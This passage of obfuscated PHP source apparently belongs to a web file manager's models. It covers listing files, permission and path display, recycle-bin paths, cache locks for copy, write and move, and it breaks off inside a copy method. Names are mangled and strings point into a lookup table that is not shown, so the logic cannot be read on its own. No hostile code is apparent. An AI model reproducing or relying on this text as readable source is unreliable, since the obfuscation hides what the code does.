$åìÌéßĞ[$­¿÷Ø×Ú[218]] = AuthModel::authCheckView($åìÌéßĞ[$­¿÷Ø×Ú[457]][$­¿÷Ø×Ú[458]]); } $this->groupPathDisplay($åìÌéßĞ); } unset($åìÌéßĞ); } public function _listAppendAuthSecret(&$æ·„›Ä) { $×º˜´˜ =& $_SERVER[•Ùç É]; if (Model($×º˜´˜[478])->get($×º˜´˜[541]) != $×º˜´˜[90]) { return; } static $ù†•¯É® = false; if (!$ù†•¯É®) { $é×«ÛÕÏ = Model($×º˜´˜[542]); $–çîĞ = Model($×º˜´˜[543]); $ù†•¯É® = $–çîĞ->listData(); $ù†•¯É® = array_to_keyvalue($ù†•¯É®, $×º˜´˜[183]); $Ú°ˆä²Ÿ = json_decode(Model($×º˜´˜[478])->get($×º˜´˜[544]), !0); $Ú°ˆä²Ÿ = array_to_keyvalue($Ú°ˆä²Ÿ, $×º˜´˜[445]); foreach ($ù†•¯É® as $Œîó›¼ => $Èüé¥äÃ) { $‘ßÔ­¬¥ = $Ú°ˆä²Ÿ[$Èüé¥äÃ[$×º˜´˜[545]]]; if (!$‘ßÔ­¬¥) { $–çîĞ->remove($Èüé¥äÃ[$×º˜´˜[445]]); unset($ù†•¯É®[$Œîó›¼]); continue; } $Ç–ÍŠ–Ì = $é×«ÛÕÏ->listData($‘ßÔ­¬¥[$×º˜´˜[457]]); if (!$Ç–ÍŠ–Ì) { $–çîĞ->remove($Èüé¥äÃ[$×º˜´˜[445]]); unset($ù†•¯É®[$Œîó›¼]); continue; } $Èüé¥äÃ[$×º˜´˜[457]] = $Ç–ÍŠ–Ì; $Èüé¥äÃ[$×º˜´˜[546]] = $‘ßÔ­¬¥; $Èüé¥äÃ[$×º˜´˜[547]] = Model($×º˜´˜[548])->getInfoSimpleOuter($Èüé¥äÃ[$×º˜´˜[497]]); $ù†•¯É®[$Œîó›¼] = $Èüé¥äÃ; } } $êùÅ³¤ë = USER_ID; $›ä¡™ı¯ = array(); $‚Å˜ÄÖ = $this->_listAppendPath($›ä¡™ı¯, !0); foreach ($æ·„›Ä as $Œîó›¼ => &$Èüé¥äÃ) { if (!is_array($Èüé¥äÃ[$×º˜´˜[457]])) { continue; } if ($Èüé¥äÃ[$×º˜´˜[180]] != $×º˜´˜[549]) { continue; } if (isset($ù†•¯É®[$Èüé¥äÃ[$×º˜´˜[183]]])) { $´Û•„Œ± = $ù†•¯É®[$Èüé¥äÃ[$×º˜´˜[183]]]; if (!is_array($Èüé¥äÃ[$×º˜´˜[509]])) { $Èüé¥äÃ[$×º˜´˜[509]] = array(); } $Èüé¥äÃ[$×º˜´˜[509]][$×º˜´˜[550]] = $´Û•„Œ±[$×º˜´˜[545]]; $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[551]] = $´Û•„Œ±; $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[552]] = $Èüé¥äÃ[$×º˜´˜[553]]; $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[554]] = $×º˜´˜[90]; if ($´Û•„Œ±[$×º˜´˜[497]] != $êùÅ³¤ë) { $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[458]] = $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[458]] & $´Û•„Œ±[$×º˜´˜[457]][$×º˜´˜[457]]; } continue; } $èó­­ÍÙ = $this->parentLevelArray($Èüé¥äÃ[$×º˜´˜[555]]); $Œ²‰¨ó = array_reverse($èó­­ÍÙ); foreach ($Œ²‰¨ó as $Ö”’ˆ¨ò => $•¹ƒ–·¼) { if (!isset($ù†•¯É®[$•¹ƒ–·¼])) { continue; } $´Û•„Œ± = $ù†•¯É®[$•¹ƒ–·¼]; $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[551]] = $´Û•„Œ±; if ($´Û•„Œ±[$×º˜´˜[497]] != $êùÅ³¤ë) { $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[458]] = $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[458]] & $´Û•„Œ±[$×º˜´˜[457]][$×º˜´˜[457]]; } $ß°Äõ•Ö = $×º˜´˜[12]; $î‚êİÀŞ = count($èó­­ÍÙ) - $Ö”’ˆ¨ò; for ($®Íâé¹ = 0; $®Íâé¹ < $î‚êİÀŞ; $®Íâé¹++) { if (!isset($‚Å˜ÄÖ[$èó­­ÍÙ[$®Íâé¹]])) { $ß°Äõ•Ö = $×º˜´˜[12]; break; } $ß°Äõ•Ö = $ß°Äõ•Ö . rtrim($‚Å˜ÄÖ[$èó­­ÍÙ[$®Íâé¹]], $×º˜´˜[8]) . $×º˜´˜[8]; } $Èüé¥äÃ[$×º˜´˜[457]][$×º˜´˜[552]] = rtrim($ß°Äõ•Ö, $×º˜´˜[8]) . $×º˜´˜[8]; break; } } unset($Èüé¥äÃ); } public function groupPathDisplay(&$›¸öĞñÎ) { $—øÊ¯ŸØ =& $_SERVER[•Ùç É]; if ($›¸öĞñÎ[$—øÊ¯ŸØ[180]] != self::TYPE_GROUP) { return; } $ø†íÁÇ¼ = Model($—øÊ¯ŸØ[556])->getInfo($›¸öĞñÎ[$—øÊ¯ŸØ[540]]); $”æ®œıÒ = $this->parentLevelArray($ø†íÁÇ¼[$—øÊ¯ŸØ[555]]); $äøâ°º = $—øÊ¯ŸØ[12]; foreach ($”æ®œıÒ as $Õ§¹Îá) { $”ìÜ¿Ç½ = Model($—øÊ¯ŸØ[556])->getInfo($Õ§¹Îá); $äøâ°º .= $”ìÜ¿Ç½[$—øÊ¯ŸØ[89]][$—øÊ¯ŸØ[183]] . $—øÊ¯ŸØ[50]; } $›¸öĞñÎ[$—øÊ¯ŸØ[557]] = $ø†íÁÇ¼[$—øÊ¯ŸØ[182]]; $›¸öĞñÎ[$—øÊ¯ŸØ[558]] = $ø†íÁÇ¼[$—øÊ¯ŸØ[555]]; $›¸öĞñÎ[$—øÊ¯ŸØ[559]] = $ø†íÁÇ¼[$—øÊ¯ŸØ[560]]; $›¸öĞñÎ[$—øÊ¯ŸØ[561]] = $äøâ°º . $ø†íÁÇ¼[$—øÊ¯ŸØ[89]][$—øÊ¯ŸØ[183]]; } protected function _listAppendPath(&$ÀôŞÉ¨³, $Ÿœ±Ÿª = false) { $º§’õŸ¿ =& $_SERVER[•Ùç É]; static $«Ğ… = array(); $¯£Ş³½ = array(); $Ë„Ã¥²› = array(); if ($Ÿœ±Ÿª) { return $«Ğ…; } foreach ($ÀôŞÉ¨³ as &$ëº“ÙÆÚ) { $™úáÄÌ¡ = $ëº“ÙÆÚ[$º§’õŸ¿[183]]; if ($ëº“ÙÆÚ[$º§’õŸ¿[455]] == $º§’õŸ¿[90] && $ëº“ÙÆÚ[$º§’õŸ¿[182]] != 0) { $«Ğ…[$™úáÄÌ¡] = $ëº“ÙÆÚ[$º§’õŸ¿[32]]; } if ($ëº“ÙÆÚ[$º§’õŸ¿[455]] == $º§’õŸ¿[90] && $ëº“ÙÆÚ[$º§’õŸ¿[182]] == 0) { $«Ğ…[$™úáÄÌ¡] = $this->_listAppendPathRoot($ëº“ÙÆÚ, array()); } if (isset($Ë„Ã¥²›[$ëº“ÙÆÚ[$º§’õŸ¿[555]]])) { continue; } $Ë„Ã¥²›[$ëº“ÙÆÚ[$º§’õŸ¿[555]]] = !0; $—“‚èå… = $this->parentLevelArray($ëº“ÙÆÚ[$º§’õŸ¿[555]]); foreach ($—“‚èå… as $ÍúŒÈ => $äÃ÷òæ¤) { if (isset($«Ğ…[$äÃ÷òæ¤])) { continue; } if ($ÍúŒÈ == 0) { $«Ğ…[$äÃ÷òæ¤] = $this->_listAppendPathRoot($ëº“ÙÆÚ, $—“‚èå…); } if ($ÍúŒÈ != 0) { $¯£Ş³½[] = $äÃ÷òæ¤; } } } unset($ëº“ÙÆÚ); $¯£Ş³½ = array_unique($¯£Ş³½); if (count($¯£Ş³½) > 0) { $Âã—şŞà = array($º§’õŸ¿[461] => array($º§’õŸ¿[462], $¯£Ş³½)); if (count($¯£Ş³½) == 1) { $ü÷æ¢Ëä = $this->sourceInfo($¯£Ş³½[0]); $¸•¶àÅİ = is_array($ü÷æ¢Ëä) ? array($ü÷æ¢Ëä) : !1; } else { $¸•¶àÅİ = $this->field($º§’õŸ¿[562])->where($Âã—şŞà)->select(); } if (!$¸•¶àÅİ) { $¸•¶àÅİ = array(); } foreach ($¸•¶àÅİ as $ºúÁÖŒı) { $«Ğ…[$ºúÁÖŒı[$º§’õŸ¿[183]]] = $ºúÁÖŒı[$º§’õŸ¿[32]]; } } $¶æëˆõÚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $áì„‡‹ä = array(); foreach ($ÀôŞÉ¨³ as &$ëº“ÙÆÚ) { $… ‘¦”ñ = $ëº“ÙÆÚ[$º§’õŸ¿[555]]; $ª´Ò¿¹Ê = $º§’õŸ¿[12]; if (isset($áì„‡‹ä[$… ‘¦”ñ])) { $ª´Ò¿¹Ê = $áì„‡‹ä[$… ‘¦”ñ]; } else { $—“‚èå… = $this->parentLevelArray($ëº“ÙÆÚ[$º§’õŸ¿[555]]); foreach ($—“‚èå… as $ÍúŒÈ => $äÃ÷òæ¤) { if (isset($«Ğ…[$äÃ÷òæ¤])) { $ª´Ò¿¹Ê .= $«Ğ…[$äÃ÷òæ¤] . $º§’õŸ¿[8]; } } $áì„‡‹ä[$… ‘¦”ñ] = $ª´Ò¿¹Ê; } $ª´Ò¿¹Ê .= $ëº“ÙÆÚ[$º§’õŸ¿[32]]; if ($ëº“ÙÆÚ[$º§’õŸ¿[455]] == $º§’õŸ¿[90]) { $ª´Ò¿¹Ê .= $º§’õŸ¿[8]; } $ëº“ÙÆÚ[$º§’õŸ¿[553]] = str_replace($º§’õŸ¿[563], $º§’õŸ¿[8], $ª´Ò¿¹Ê); if ($ëº“ÙÆÚ[$º§’õŸ¿[182]] == $º§’õŸ¿[214]) { $ëº“ÙÆÚ[$º§’õŸ¿[32]] = trim($«Ğ…[$ëº“ÙÆÚ[$º§’õŸ¿[183]]], $º§’õŸ¿[8]); $ëº“ÙÆÚ[$º§’õŸ¿[553]] = $ëº“ÙÆÚ[$º§’õŸ¿[32]] . $º§’õŸ¿[8]; } if (intval($ëº“ÙÆÚ[$º§’õŸ¿[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ëº“ÙÆÚ, $—“‚èå…, $¶æëˆõÚ); } } unset($ëº“ÙÆÚ); return $ÀôŞÉ¨³; } private function _listAppendPathRecycle(&$Ù§ŸÂ²š, $ÂÓ¿«¬Á, $·Ğğ©ÃÔ) { $¸í’Ğ×È =& $_SERVER[•Ùç É]; if (!in_array($·Ğğ©ÃÔ, $ÂÓ¿«¬Á) && $Ù§ŸÂ²š[$¸í’Ğ×È[183]] != $·Ğğ©ÃÔ) { return; } $ÅğûÇĞ± = explode($¸í’Ğ×È[8], trim($Ù§ŸÂ²š[$¸í’Ğ×È[553]], $¸í’Ğ×È[8])); $¬”»’¹‚ = implode($¸í’Ğ×È[8], array_slice($ÅğûÇĞ±, 2)); $Ù§ŸÂ²š[$¸í’Ğ×È[553]] = $¸í’Ğ×È[8] . LNG($¸í’Ğ×È[564]) . $¸í’Ğ×È[8] . ltrim($¬”»’¹‚, $¸í’Ğ×È[8]); $Ù§ŸÂ²š[$¸í’Ğ×È[555]] = $¸í’Ğ×È[565] . implode($¸í’Ğ×È[50], array_slice($ÂÓ¿«¬Á, 1)) . $¸í’Ğ×È[50]; if ($Ù§ŸÂ²š[$¸í’Ğ×È[183]] == $·Ğğ©ÃÔ) { $Ù§ŸÂ²š[$¸í’Ğ×È[555]] = $¸í’Ğ×È[565]; $Ù§ŸÂ²š[$¸í’Ğ×È[182]] = $¸í’Ğ×È[214]; $Ù§ŸÂ²š[$¸í’Ğ×È[32]] = LNG($¸í’Ğ×È[564]); } $Ù§ŸÂ²š[$¸í’Ğ×È[566]] = $¸í’Ğ×È[567]; } protected function _listAppendPathRoot(&$ÜËóúà¥, $«¡ì­àú) { $Àœí÷Ã =& $_SERVER[•Ùç É]; static $ŸŒùè¬” = false; $†®ù©¦ = $Àœí÷Ã[12]; if ($ÜËóúà¥[$Àœí÷Ã[180]] == self::TYPE_USER) { if ($ÜËóúà¥[$Àœí÷Ã[540]] == USER_ID) { $†®ù©¦ = LNG($Àœí÷Ã[568]); if ($ŸŒùè¬” === !1) { $ƒ¸˜öÖú = Model($Àœí÷Ã[569])->getInfoFull(USER_ID); $ŸŒùè¬” = _get($ƒ¸˜öÖú, $Àœí÷Ã[570], $Àœí÷Ã[12]); } if ($«¡ì­àú && $«¡ì­àú[0] == $ŸŒùè¬” || !$«¡ì­àú && $ÜËóúà¥[$Àœí÷Ã[183]] == $ŸŒùè¬”) { $†®ù©¦ = LNG($Àœí÷Ã[571]); $ÜËóúà¥[$Àœí÷Ã[572]] = $Àœí÷Ã[573]; } if (!$«¡ì­àú) { $ÜËóúà¥[$Àœí÷Ã[32]] = $†®ù©¦; } } else { $ÜËóúà¥[$Àœí÷Ã[574]] = Model($Àœí÷Ã[548])->getInfoSimpleOuter($ÜËóúà¥[$Àœí÷Ã[540]]); $†®ù©¦ = LNG($Àœí÷Ã[575]) . $Àœí÷Ã[165] . $ÜËóúà¥[$Àœí÷Ã[574]][$Àœí÷Ã[32]] . $Àœí÷Ã[167]; } } else { if ($ÜËóúà¥[$Àœí÷Ã[180]] == self::TYPE_GROUP) { $õóÃœŠØ = Model($Àœí÷Ã[556])->getInfoSimple($ÜËóúà¥[$Àœí÷Ã[540]]); $†®ù©¦ = $õóÃœŠØ[$Àœí÷Ã[32]]; } else { if ($ÜËóúà¥[$Àœí÷Ã[180]] == self::TYPE_SYSTEM) { $†®ù©¦ = $Àœí÷Ã[576]; } } } $†®ù©¦ = $†®ù©¦ ? $Àœí÷Ã[8] . $†®ù©¦ . $Àœí÷Ã[8] : $Àœí÷Ã[8]; return $†®ù©¦; } protected function _listAppendUser(&$Áîò„¬Í) { $ŠáÕşó =& $_SERVER[•Ùç É]; $¹êŸ÷ô¾ = array_to_keyvalue($Áîò„¬Í, $ŠáÕşó[12], $ŠáÕşó[497]); $ºµ¢¹Ê = array_to_keyvalue($Áîò„¬Í, $ŠáÕşó[12], $ŠáÕşó[499]); $Ã‹åÉ = array_merge($¹êŸ÷ô¾, $ºµ¢¹Ê); $¶ÁÎ±œÛ = Model($ŠáÕşó[569])->userListInfo($Ã‹åÉ); foreach ($Áîò„¬Í as &$¾âó›Ò) { $çôú‘Ÿ = $¾âó›Ò[$ŠáÕşó[497]]; $¾âó›Ò[$ŠáÕşó[497]] = $¶ÁÎ±œÛ[$çôú‘Ÿ] ? $¶ÁÎ±œÛ[$çôú‘Ÿ] : !1; $çôú‘Ÿ = $¾âó›Ò[$ŠáÕşó[499]]; $¾âó›Ò[$ŠáÕşó[499]] = $¶ÁÎ±œÛ[$çôú‘Ÿ] ? $¶ÁÎ±œÛ[$çôú‘Ÿ] : !1; if (isset($¾âó›Ò[$ŠáÕşó[509]]) && $¾âó›Ò[$ŠáÕşó[509]][$ŠáÕşó[577]]) { $¤­³ÈÆ° = $GLOBALS[$ŠáÕşó[6]][$ŠáÕşó[91]][$ŠáÕşó[578]]; if ($¾âó›Ò[$ŠáÕşó[509]][$ŠáÕşó[579]] <= time() - $¤­³ÈÆ°) { $this->metaSet($¾âó›Ò[$ŠáÕşó[183]], $ŠáÕşó[577], null); $this->metaSet($¾âó›Ò[$ŠáÕşó[183]], $ŠáÕşó[579], null); unset($¾âó›Ò[$ŠáÕşó[509]][$ŠáÕşó[577]]); continue; } $„Ñ‘††ß = $¾âó›Ò[$ŠáÕşó[509]][$ŠáÕşó[577]]; $¾âó›Ò[$ŠáÕşó[509]][$ŠáÕşó[580]] = Model($ŠáÕşó[569])->getInfoSimpleOuter($„Ñ‘††ß); } } unset($¾âó›Ò); } public function parentLevelArray($ŠÎ§«©ê) { $¾ôéŠ© =& $_SERVER[•Ùç É]; $ŠÎ§«©ê = explode($¾ôéŠ©[50], trim($ŠÎ§«©ê, $¾ôéŠ©[50])); return array_remove_value($ŠÎ§«©ê, $¾ôéŠ©[214]); } public function listAll($¶ÑÄÂÈæ) { $İŒ™´‘Ã =& $_SERVER[•Ùç É]; $ğ·ÅñŸõ = $this->sourceInfo($¶ÑÄÂÈæ); $îïæ¹‹ = array($İŒ™´‘Ã[581] => array($İŒ™´‘Ã[582], $ğ·ÅñŸõ[$İŒ™´‘Ã[555]] . $¶ÑÄÂÈæ . $İŒ™´‘Ã[583]), $İŒ™´‘Ã[584] => 0); $ª÷İû¼Û = $İŒ™´‘Ã[585]; $¸Óäœ› = "\114\x45\106\x54\40\112\117\x49\116\40{$this->tablePrefix}\x69\x6f\137\146\151\x6c\x65\x20\x66\151\x6c\x65\x20\157\x6e\40\x73\157\x75\x72\143\145\56\146\151\x6c\145\111\x44\40\x3d\x20\146\x69\154\145\56\146\x69\154\145\111\104"; $ò†’¹ºÙ = $this->alias($İŒ™´‘Ã[489])->field($ª÷İû¼Û)->where($îïæ¹‹)->join($¸Óäœ›)->select(); $this->_listAppendAuth($ò†’¹ºÙ); $this->_listAppendUser($ò†’¹ºÙ); $this->_listAppendPath($ò†’¹ºÙ); $ò†’¹ºÙ = array_to_keyvalue($ò†’¹ºÙ, $İŒ™´‘Ã[183]); $š£¦»³ = "\57{$ğ·ÅñŸõ[$İŒ™´‘Ã[32]]}\x2f"; $š£¦»³ = $š£¦»³ == $İŒ™´‘Ã[563] ? $İŒ™´‘Ã[8] : $š£¦»³; $®„°‹ä… = array(); foreach ($ò†’¹ºÙ as $ˆŒÕ²«¾ => $İšŒÙÜ) { $çÂĞÓ½ = $this->parentLevelArray($İšŒÙÜ[$İŒ™´‘Ã[555]]); array_shift($çÂĞÓ½); $ÄøÊıÖŒ = $š£¦»³; for ($É´ÒŒ® = 0; $É´ÒŒ® < count($çÂĞÓ½); $É´ÒŒ®++) { $ÄøÊıÖŒ .= $ò†’¹ºÙ[$çÂĞÓ½[$É´ÒŒ®]][$İŒ™´‘Ã[32]] . $İŒ™´‘Ã[8]; } $ÄøÊıÖŒ .= $İšŒÙÜ[$İŒ™´‘Ã[32]]; if ($İšŒÙÜ[$İŒ™´‘Ã[455]]) { $ÄøÊıÖŒ .= $İŒ™´‘Ã[8]; } $ó›œ’ƒ = array($İŒ™´‘Ã[465] => str_replace($İŒ™´‘Ã[563], $İŒ™´‘Ã[8], str_replace($İŒ™´‘Ã[563], $İŒ™´‘Ã[8], str_replace($İŒ™´‘Ã[563], $İŒ™´‘Ã[8], $ÄøÊıÖŒ))), $İŒ™´‘Ã[586] => intval($İšŒÙÜ[$İŒ™´‘Ã[455]]), $İŒ™´‘Ã[587] => intval($İšŒÙÜ[$İŒ™´‘Ã[78]]), $İŒ™´‘Ã[87] => intval($İšŒÙÜ[$İŒ™´‘Ã[87]]), $İŒ™´‘Ã[89] => $this->pathInfoFilter($İšŒÙÜ)); if (!$ó›œ’ƒ[$İŒ™´‘Ã[455]]) { $ó›œ’ƒ[$İŒ™´‘Ã[511]] = $İšŒÙÜ[$İŒ™´‘Ã[511]]; } $®„°‹ä…[] = $ó›œ’ƒ; } $®„°‹ä… = array_sort_by($®„°‹ä…, $İŒ™´‘Ã[86]); return $®„°‹ä…; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÙÅ“Œóü) { $ÆÖ·”Úµ =& $_SERVER[•Ùç É]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÆÖ·”Úµ[588], $ÙÅ“Œóü); $—¯é©ñ£ = 1; $this->_lockEvent($ÙÅ“Œóü, array($ÆÖ·”Úµ[589], $ÆÖ·”Úµ[590]), $—¯é©ñ£); $this->_lockParent($ÙÅ“Œóü, array($ÆÖ·”Úµ[590]), $—¯é©ñ£); $this->_lockEvent($ÙÅ“Œóü, array($ÆÖ·”Úµ[591], $ÆÖ·”Úµ[592]), $—¯é©ñ£); $this->_lockCheckEnd($ÆÖ·”Úµ[588], $ÙÅ“Œóü); } public function lockCopyEnd($³“Ú²ëí) { $èâğò› =& $_SERVER[•Ùç É]; if (!$this->allowLock()) { return; } $Ïû¸ó³‹ = 0; $this->_lockEvent($³“Ú²ëí, array($èâğò›[589], $èâğò›[590]), $Ïû¸ó³‹); $this->_lockParent($³“Ú²ëí, array($èâğò›[590]), $Ïû¸ó³‹); $this->_lockEvent($³“Ú²ëí, array($èâğò›[591], $èâğò›[592]), $Ïû¸ó³‹); } public function lockWriteStart($×•Çæƒ, $ıï »¬¾ = '') { $¸’ùÑÂƒ =& $_SERVER[•Ùç É]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸’ùÑÂƒ[589], $×•Çæƒ); $¯¶»ë›è = 1; $this->_lockKey($¸’ùÑÂƒ[593] . $×•Çæƒ . $¸’ùÑÂƒ[10] . $ıï »¬¾, $¯¶»ë›è); $this->_lockEvent($×•Çæƒ, array($¸’ùÑÂƒ[588], $¸’ùÑÂƒ[590]), $¯¶»ë›è); $this->_lockParent($×•Çæƒ, array($¸’ùÑÂƒ[588], $¸’ùÑÂƒ[590]), $¯¶»ë›è); $this->_lockCheckEnd($¸’ùÑÂƒ[589], $×•Çæƒ); } public function lockWriteEnd($ªê¤·¬ã, $Ç¦™ÒÇÜ = '') { $”¨í¢ =& $_SERVER[•Ùç É]; if (!$this->allowLock()) { return; } $öÅƒ¢õ¶ = 0; $this->_lockKey($”¨í¢[593] . $ªê¤·¬ã . $”¨í¢[10] . $Ç¦™ÒÇÜ, $öÅƒ¢õ¶); $this->_lockEvent($ªê¤·¬ã, array($”¨í¢[588], $”¨í¢[590]), $öÅƒ¢õ¶); $this->_lockParent($ªê¤·¬ã, array($”¨í¢[588], $”¨í¢[590]), $öÅƒ¢õ¶); } public function lockMoveStart($İ®ºäØ) { $ØÛª€è =& $_SERVER[•Ùç É]; if (!$this->allowLock()) { return; } $this->_lockCheck($ØÛª€è[590], $İ®ºäØ); $œœ¾²› = 1; $this->_lockKey($ØÛª€è[594] . $İ®ºäØ, $œœ¾²›); $this->_lockEvent($İ®ºäØ, array($ØÛª€è[588], $ØÛª€è[589]), $œœ¾²›); $this->_lockParent($İ®ºäØ, array($ØÛª€è[588], $ØÛª€è[590]), $œœ¾²›); $this->_lockEvent($İ®ºäØ, array($ØÛª€è[595], $ØÛª€è[591], $ØÛª€è[592]), $œœ¾²›); $this->_lockCheckEnd($ØÛª€è[590], $İ®ºäØ); } public function lockMoveEnd($ÁÄØğÃ) { $Š¬«ˆ©ƒ =& $_SERVER[•Ùç É]; if (!$this->allowLock()) { return; } $ù¥Œ©± = 0; $this->_lockKey($Š¬«ˆ©ƒ[594] . $ÁÄØğÃ, $ù¥Œ©±); $this->_lockEvent($ÁÄØğÃ, array($Š¬«ˆ©ƒ[588], $Š¬«ˆ©ƒ[589]), $ù¥Œ©±); $this->_lockParent($ÁÄØğÃ, array($Š¬«ˆ©ƒ[588], $Š¬«ˆ©ƒ[590]), $ù¥Œ©±); $this->_lockEvent($ÁÄØğÃ, array($Š¬«ˆ©ƒ[595], $Š¬«ˆ©ƒ[591], $Š¬«ˆ©ƒ[592]), $ù¥Œ©±); } private function _lockCheck($½µÛğëş, $®É„Á–) { $Äë…›ÅØ =& $_SERVER[•Ùç É]; $ÜÆşèòú = $this->sourceInfo($®É„Á–); $®ÒÅ®è = $½µÛğëş . $Äë…›ÅØ[10] . $®É„Á–; $this->_lockTimeStart[$®ÒÅ®è] = timeFloat(); if (!is_array($ÜÆşèòú)) { return; } $ıì¿ŠÛµ = LNG($Äë…›ÅØ[596]); CacheLock::setErrorMsg($Äë…›ÅØ[165] . htmlspecialchars($ÜÆşèòú[$Äë…›ÅØ[32]]) . $Äë…›ÅØ[167] . $ıì¿ŠÛµ); $this->_lockKey($®ÒÅ®è, 1); $this->_lockKey($®ÒÅ®è, 0); $»ÔóóÛö = array_reverse($this->parentLevelArray($ÜÆşèòú[$Äë…›ÅØ[555]])); foreach ($»ÔóóÛö as $²”£ã˜) { $®ÒÅ®è = $½µÛğëş . $Äë…›ÅØ[597] . $²”£ã˜; if (CacheLock::lockGet($Äë…›ÅØ[598] . $®ÒÅ®è)) { $ÜÆşèòú = $this->sourceInfo($²”£ã˜); CacheLock::setErrorMsg($Äë…›ÅØ[165] . htmlspecialchars($ÜÆşèòú[$Äë…›ÅØ[32]]) . $Äë…›ÅØ[167] . $ıì¿ŠÛµ); $this->_lockKey($®ÒÅ®è, 1); $this->_lockKey($®ÒÅ®è, 0); } } } private function _lockCheckEnd($†°şºµû, $§Õ‰ù—ó) { $ÑÕÅÂßü =& $_SERVER[•Ùç É]; $¨ÊıüŸâ = $†°şºµû . $ÑÕÅÂßü[10] . $§Õ‰ù—ó; CacheLock::setErrorMsg($ÑÕÅÂßü[424]); if (!isset($this->_lockTimeStart[$¨ÊıüŸâ])) { return; } $•ëß’¦Ü = timeFloat() - $this->_lockTimeStart[$¨ÊıüŸâ]; unset($this->_lockTimeStart[$¨ÊıüŸâ]); if ($•ëß’¦Ü > 0.5) { unset(self::$cacheSourceInfo[$ÑÕÅÂßü[503] . $§Õ‰ù—ó]); } $ŞÎ©¶ÛÛ = $this->sourceInfo($§Õ‰ù—ó); if (!$ŞÎ©¶ÛÛ) { show_json(LNG($ÑÕÅÂßü[107]), !1); } } private function _lockParent($’Œã¯Åõ, $£í†Äú, $•ó‚ë‘ı) { if (!$this->autoLockSet) { return; } $©æâŠü = $this->sourceInfo($’Œã¯Åõ); if (!is_array($©æâŠü)) { return; } $ëñ¿—Üú = array_reverse($this->parentLevelArray($©æâŠü[$_SERVER[•Ùç É][555]])); foreach ($ëñ¿—Üú as $Œº™£»‡) { $this->_lockEvent($Œº™£»‡, $£í†Äú, $•ó‚ë‘ı); } } private function _lockEvent($“ë±¶Àç, $¾Ú­­í‡, $ï‹ „ü¥) { $²‚½ô™ç =& $_SERVER[•Ùç É]; if (!$this->autoLockSet) { return; } foreach ($¾Ú­­í‡ as $£˜Ê˜ò) { $¶ëÇÍ… = $£˜Ê˜ò . $²‚½ô™ç[10] . $“ë±¶Àç; if ($ï‹ „ü¥ && CacheLock::lockGet($²‚½ô™ç[598] . $¶ëÇÍ…)) { continue; } $this->_lockKey($¶ëÇÍ…, $ï‹ „ü¥); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($…·¡ò½Á, $ç÷õ÷æ· = 1) { $‘‚£û¥ã = $_SERVER[•Ùç É][598] . md5($…·¡ò½Á); if ($ç÷õ÷æ·) { if (isset(self::$_lockItemArr[$‘‚£û¥ã])) { return; } self::$_lockItemArr[$‘‚£û¥ã] = 1; CacheLock::lock($‘‚£û¥ã, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‘‚£û¥ã])) { return; } unset(self::$_lockItemArr[$‘‚£û¥ã]); CacheLock::unlock($‘‚£û¥ã); } } public function isParentOf($÷‘Œ¤ÌË, $Ö†ºæÍ¢) { $¶ÖÈ÷í… =& $_SERVER[•Ùç É]; $ñº¦Å£• = $this->sourceInfo($÷‘Œ¤ÌË); $®¿ø•›Ú = $this->sourceInfo($Ö†ºæÍ¢); $¤ğ‚ã„« = $ñº¦Å£•[$¶ÖÈ÷í…[555]] . $ñº¦Å£•[$¶ÖÈ÷í…[183]] . $¶ÖÈ÷í…[50]; $¶£Êç¬ = $®¿ø•›Ú[$¶ÖÈ÷í…[555]] . $®¿ø•›Ú[$¶ÖÈ÷í…[183]] . $¶ÖÈ÷í…[50]; $‡Ä¾—ãè = strpos($¶£Êç¬, $¤ğ‚ã„«) === 0; return $‡Ä¾—ãè; } private $targetIsDelete = 0; public function copy($¢”ÜøøÜ, $İÙ§Î¾, $¯¾‹Ğ¦ = REPEAT_REPLACE, $–âó¦’ê = '') { $ååõ¢öÛ =& $_SERVER[•Ùç É]; $Ï‚‚˜Ï = $this->sourceInfo($¢”ÜøøÜ); $éºüÚÇ• = $this->sourceInfo($İÙ§Î¾); if (!$Ï‚‚˜Ï || !$éºüÚÇ• || $éºüÚÇ•[$ååõ¢öÛ[455]] != $ååõ¢öÛ[90]) { return !1; } if ($this->isParentOf($¢”ÜøøÜ, $İÙ§Î¾)) { return !1; } $ëÇÚğ¸· = $–âó¦’ê ? $–âó¦’ê : $Ï‚‚˜Ï[$ååõ¢öÛ[32]]; $this->lockCopyStart($¢”ÜøøÜ); $this->lockWriteStart($İÙ§Î¾, $ëÇÚğ¸·); $ş‰Óä¿Ğ = array($ååõ¢öÛ[599] => array(), $ååõ¢öÛ[600] => array(), $ååõ¢öÛ[601] => array()); $this->targetIsDelete = intval($Ï‚‚˜Ï[$ååõ¢öÛ[475]]); $½ïˆ±¯¹ = $this->fileNameExistAuto($İÙ§Î¾, $Ï‚‚˜Ï); $ ï‘ÎÒô = $this->_copy($¢”ÜøøÜ, $İÙ§Î¾, $¯¾‹Ğ¦, $ş‰Óä¿Ğ, !0, $–âó¦’ê); $this->_childrenListClear(); $this->lockCopyEnd($¢”ÜøøÜ); $this->lockWriteEnd($İÙ§Î¾, $ëÇÚğ¸·); if ($Ï‚‚˜Ï[$ååõ¢öÛ[455]] == $ååõ¢öÛ[90] && $½ïˆ±¯¹ == $ ï‘ÎÒô) { $this->folderSizeResetChildren($½ïˆ±¯¹); } Model($ååõ¢öÛ[602])->addAll($ş‰Óä¿Ğ[$ååõ¢öÛ[600]], array(), !0); if ($½ïˆ±¯¹ != $ ï‘ÎÒô || $Ï‚‚˜Ï[$ååõ¢öÛ[455]] == $ååõ¢öÛ[90]) { Model($ååõ¢öÛ[603])->eventCopy($ ï‘ÎÒô); } 